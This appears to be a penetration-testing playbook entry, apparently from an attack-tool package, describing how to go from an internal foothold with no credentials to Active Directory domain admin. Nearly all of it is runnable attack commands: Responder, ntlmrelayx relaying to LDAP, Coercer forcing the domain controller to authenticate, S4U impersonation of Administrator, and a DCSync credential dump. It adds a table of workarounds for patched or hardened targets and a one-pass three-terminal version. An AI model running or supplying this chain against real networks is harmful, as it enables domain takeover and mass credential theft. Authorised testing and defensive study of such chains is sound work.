# [2026-04] NTLM Relay + Coercer → Domain Admin (No Password Needed)

## Scenario Category
Penetration testing / internal network / AD attacks

## Target Overview
With an internal network foothold but no credentials at all, obtain domain admin privileges through the NTLM relay attack chain.

## Complete Execution Chain

1. After getting the internal foothold, start Responder listening (SMB/HTTP off)
   ```bash
   # Edit /etc/responder/Responder.conf
   # SMB = Off, HTTP = Off
   responder -I eth0 -v
   ```

2. Start ntlmrelayx relaying to LDAP (for the AD CS attack)
   ```bash
   ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
   ```

3. Use Coercer to force the DC to authenticate to us
   ```bash
   coercer coerce -u '' -p '' -d domain.local \
     -l attacker_ip -t dc01.domain.local --always-continue
   ```

4. The DC's machine-account NTLM authentication is relayed to LDAP
5. ntlmrelayx automatically creates a machine account and configures constrained delegation
6. Use S4U2Self + S4U2Proxy to impersonate the domain administrator
   ```bash
   getST.py -spn cifs/dc01.domain.local \
     -impersonate Administrator \
     domain.local/CREATED_MACHINE\$:'password' -dc-ip 10.0.0.1
   ```

7. DCSync using the ticket
   ```bash
   export KRB5CCNAME=Administrator.ccache
   secretsdump.py -k -no-pass dc01.domain.local
   ```

## Pitfall Log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| Coercer fails to trigger authentication | The target DC is patched against PetitPotam | Switch to PrinterBug (MS-RPRN) | 30min |
| ntlmrelayx reports LDAP signing required | The DC has LDAP signing enabled | Relay to LDAPS (636) or the HTTP AD CS endpoint instead | 20min |
| The created machine account cannot do S4U | Domain policy limits machine-account creation | Substitute an existing low-privileged domain user account | 15min |

## Toolchain Findings
- Coercer is more convenient than calling PetitPotam manually; it tries multiple protocols automatically
- ntlmrelayx's `--delegate-access` parameter is the key; it completes the delegation configuration automatically
- If LDAP signing is enabled, relay to AD CS's HTTP endpoint instead (ESC8)

## Key Code/Commands

```bash
# Full attack chain in one pass (needs 3 terminals)
# Terminal 1: Responder
responder -I eth0 -v

# Terminal 2: ntlmrelayx
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker

# Terminal 3: Coercer
coercer coerce -u '' -p '' -d domain.local -l attacker_ip -t dc01.domain.local
```

## Reusable Patterns/Script Snippets

```bash
# Quick NTLM Relay feasibility check
# 1. Check SMB signing
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2. Check LDAP signing
crackmapexec ldap dc01.domain.local -u '' -p '' -M ldap-checker

# 3. Check triggerable protocols
coercer scan -u user -p pass -d domain.local -t dc01.domain.local
```

## Improvement Suggestions for This Package
- Coercer and Responder are already in routing and bootstrap ✓
- ntlmrelayx is part of the impacket suite, preinstalled on Kali ✓

## Evolution Actions
- [x] No update needed (already covered)

## Environment Info
- Kali 2026.1, impacket 0.12.0, coercer 2.4.3
- Target: Windows Server 2022 DC, domain functional level 2016
- Prerequisite: internal network foothold already obtained (via a VPN vulnerability)
